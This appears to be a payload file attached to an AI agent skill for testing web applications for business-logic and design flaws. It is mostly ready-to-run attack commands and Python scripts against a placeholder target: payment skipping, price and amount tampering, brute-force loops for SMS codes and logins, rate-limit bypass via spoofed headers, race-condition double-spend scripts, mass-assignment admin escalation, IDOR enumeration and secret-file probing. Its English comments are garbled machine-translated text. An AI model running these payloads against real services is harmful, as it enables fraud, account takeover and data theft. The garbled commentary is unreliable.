# Payloads: notsecure design / Insecure Design

> thisfileis `SKILL.md` Supplementary Files，containsall attackpayloadandtestingcommand。

---

## 1. Business Logic Flaw Testing

### 1.1 Workflow Bypass - Skip Payment to Shipping

```bash
# jumpoverpaymentdirecttuneuseshippinginterface
curl -X POST http://target/api/orders/123/ship \
  -H "Authorization: Bearer $TOKEN"
```

### 1.2 State Machine Illegal Transition

```bash
# from"pending payment"directto"already complete"
curl -X PATCH http://target/api/orders/123 \
  -H "Content-Type: application/json" \
  -d '{"status": "completed"}'
```

### 1.3 Negative Amount Attack

```bash
# 负numberamountattack
curl -X POST http://target/api/transfer \
  -d '{"from": "123", "to": "456", "amount": -1000}'
```

### 1.4 Price Tampering via Hidden Fields

```bash
# modifyhideFieldin price格
curl -X POST http://target/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"item_id": "999", "price": "0.01", "quantity": 1}'
```

### 1.5 Discount Code Reuse / Stack

```bash
# repeatapplicationdiscountcode
curl -X POST http://target/api/apply-coupon \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"code": "WELCOME50"}'

# 再timeapplicationsameadiscountcode
curl -X POST http://target/api/apply-coupon \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"code": "WELCOME50"}'
```

---

## 2. Rate Limiting Bypass

### 2.1 Verification Code Brute Force

```bash
# continuousrequestverifycodeinterface - Detectspeedratelimitation
for i in $(seq 1 100); do
  curl -s http://target/api/send-sms?phone=13800138000 -o /dev/null -w "%{http_code}\n"
done
```

### 2.2 Login Brute Force Rate Limit Test

```bash
# testinglogininterfacespeedratelimitation
for i in $(seq 1 50); do
  curl -s -X POST http://target/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"admin\", \"password\": \"pass${i}\"}" \
    -o /dev/null -w "%{http_code}\n"
done
```

### 2.3 Rate Limit Bypass via Header Manipulation

```bash
# use X-Forwarded-For bypassbaseat IP speedratelimitation
for i in $(seq 1 100); do
  curl -s http://target/api/send-sms \
    -H "X-Forwarded-For: 10.0.0.${i}" \
    -d "phone=13800138000" \
    -o /dev/null -w "%{http_code}\n"
done
```

---

## 3. Race Condition Exploitation (Turbo Intruder)

### 3.1 Python Threading Race Condition Script

```python
# Turbo Intruder 风格 concurrentracetesting
import threading
import requests

def race_condition_test(url, payload, threads=50):
    """测试目标 URL 的竞争条件"""
    results = []
    barrier = threading.Barrier(threads)

    def send_request():
        barrier.wait()  # 确保所有线程同时发送
        try:
            r = requests.post(url, json=payload, timeout=10)
            results.append(r.status_code)
        except Exception:
            results.append(None)

    workers = [threading.Thread(target=send_request) for _ in range(threads)]
    for w in workers:
        w.start()
    for w in workers:
        w.join()

    success_count = results.count(200)
    print(f"[+] 成功请求数: {success_count}/{threads}")
    if success_count > 1:
        print(f"[!] 疑似 Race Condition 漏洞!")

# Usage Example: librarystoreonlyhas 1 piece，butconcurrentbelowsinglecan cansuccessmultipletime
race_condition_test(
    "http://target/api/buy",
    {"item_id": 1, "quantity": 1},
    threads=50
)
```

### 3.2 Double Spend / Double Withdraw Race

```python
# balanceracecondition - concurrenttransfer耗exhaustivebalance
import threading
import requests

def double_spend_test(account_from, account_to, amount, threads=20):
    """并发转账测试 - 检查余额是否可以被超额消费"""
    url = "http://target/api/transfer"
    payload = {"from": account_from, "to": account_to, "amount": amount}
    results = {"success": 0, "fail": 0, "errors": []}
    lock = threading.Lock()
    barrier = threading.Barrier(threads)

    def transfer():
        barrier.wait()
        try:
            r = requests.post(url, json=payload, timeout=10)
            with lock:
                if r.status_code == 200:
                    results["success"] += 1
                else:
                    results["fail"] += 1
        except Exception as e:
            with lock:
                results["errors"].append(str(e))

    workers = [threading.Thread(target=transfer) for _ in range(threads)]
    for w in workers:
        w.start()
    for w in workers:
        w.join()

    print(f"[+] 成功: {results['success']}, 失败: {results['fail']}")
    if results["success"] > 1:
        print("[!] Race Condition: 余额被多次扣减!")

double_spend_test("user_A", "user_B", 100, threads=20)
```

---

## 4. Mass Assignment Testing

### 4.1 Role Escalation via Mass Assignment

```bash
# registerwhen attemptinjection role/is_admin Field
curl -X POST http://target/api/register \
  -H "Content-Type: application/json" \
  -d '{"username": "testuser", "password": "pass123", "email": "test@test.com", "role": "admin"}'

# orupdatepersonalmaterialwhen injectionpermissionField
curl -X PUT http://target/api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test User", "is_admin": true}'
```

### 4.2 Price Override via Mass Assignment

```bash
# createorderwhen attemptcoveringprice格Field
curl -X POST http://target/api/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 42, "quantity": 1, "price": 0.01}'
```

---

## 5. IDOR Testing

### 5.1 Sequential ID Enumeration

```bash
# traverseorder ID accessitsotheruserorder
for id in $(seq 1 500); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    http://target/api/orders/$id \
    -H "Authorization: Bearer $TOKEN")
  if [ "$code" = "200" ]; then
    echo "[+] Order $id accessible (200)"
  fi
done
```

### 5.2 UUID-Based IDOR

```bash
# attemptaccessitsotheruser resource
curl -s http://target/api/users/$ANOTHER_USER_ID/profile \
  -H "Authorization: Bearer $TOKEN"
```

### 5.3 API Endpoint IDOR - Document Download

```bash
# attemptdownloaditsotheruser documentation
curl -s http://target/api/documents/$DOC_ID/download \
  -H "Authorization: Bearer $TOKEN" \
  -o leaked_doc.pdf
```

---

## 6. Improper Asset Management

### 6.1 Exposed API Documentation

```bash
# checkcommon API documentationpath
for path in /swagger-ui.html /api-docs /v1/api-docs /v2/api-docs /swagger.json /openapi.json /graphql /graphiql; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://target${path}")
  if [ "$code" = "200" ]; then
    echo "[+] Found: $path (200)"
  fi
done
```

### 6.2 Staging / Debug Endpoints

```bash
# Detectenvironmentconfigurationleakage
for path in /.env /config.json /debug /actuator /actuator/env /phpinfo.php /server-status; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://target${path}")
  if [ "$code" = "200" ]; then
    echo "[+] Found: $path (200)"
  fi
done
```

### 6.3 Old API Version Still Active

```bash
# checkoldversion API iswhether仍然can use
curl -s http://target/api/v1/admin/users -H "Authorization: Bearer $TOKEN"
curl -s http://target/api/v2/admin/users -H "Authorization: Bearer $TOKEN"
curl -s http://target/api/v3/admin/users -H "Authorization: Bearer $TOKEN"
```

---

## 7. Security Misconfiguration Detection

### 7.1 CORS Misconfiguration

```bash
# testingiswhetherallowsarbitrary Origin
curl -s -I http://target/api/data \
  -H "Origin: https://evil.com" | grep -i "access-control-allow"

# testingiswhetheranti射 Origin
curl -s -I http://target/api/data \
  -H "Origin: https://evil.attacker.com" | grep -i "access-control-allow"
```

### 7.2 Verbose Error Messages

```bash
# triggererrorviewiswhetherleakagestackinformation
curl -s http://target/api/users/INVALID_ID_FORMAT
curl -s -X POST http://target/api/login -d '{"username": "a"*10000}'
```

---

## 8. Threat Modeling Test Cases

### 8.1 STRIDE Analysis Checklist

```
对每个系统组件执行以下检查:

S - Spoofing:
   [ ] 能否冒充其他用户？
   [ ] 认证机制是否可靠？
   [ ] Session 管理是否安全？

T - Tampering:
   [ ] 数据在传输中能否被篡改？
   [ ] 数据在存储中能否被篡改？
   [ ] 完整性校验是否存在？

R - Repudiation:
   [ ] 操作是否可抵赖？
   [ ] 审计日志是否完整？
   [ ] 日志是否防篡改？

I - Information Disclosure:
   [ ] 敏感数据是否暴露？
   [ ] 加密是否到位？
   [ ] 错误信息是否泄露敏感数据？

D - Denial of Service:
   [ ] 是否存在资源耗尽风险？
   [ ] 速率限制是否到位？
   [ ] 是否有降级方案？

E - Elevation of Privilege:
   [ ] 能否提权？
   [ ] 权限检查是否一致？
   [ ] 是否存在权限绕过路径？
```

### 8.2 Trust Boundary Defect Checklist

```
常见 trust boundary 缺陷检查:

[ ] 内部 API 无认证（assume internal = trusted）
[ ] 微服务间调用无鉴权
[ ] 管理接口仅靠网络隔离保护
[ ] WebSocket 连接缺少 origin 检查
[ ] 文件上传无类型/大小验证
[ ] 第三方回调无签名验证
[ ] 定时任务无并发控制
[ ] 缓存数据无过期/刷新机制
```
